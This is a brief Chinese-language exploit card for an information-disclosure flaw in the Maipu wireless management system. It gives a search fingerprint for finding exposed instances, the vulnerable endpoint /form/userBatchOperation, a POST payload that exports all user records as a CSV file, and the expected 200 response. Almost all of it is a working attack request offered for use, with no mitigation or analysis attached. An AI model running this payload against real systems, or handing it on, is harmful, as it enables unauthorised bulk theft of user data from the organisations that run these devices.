# 迈普无线管理系统userBatchOperation存在信息泄漏漏洞

迈普无线管理系统 ｜ 信息泄露 ｜ —
- **指纹**：`body="/switchMlcVersion_login"`
- **请求**：`POST /form/userBatchOperation HTTP/1.1`

**Payload**
```
searchType=ALL&search=&fileNameHttp=&userCsvFlag=3&btnExportCsv=导出CSV文件
```
- **响应特征**：200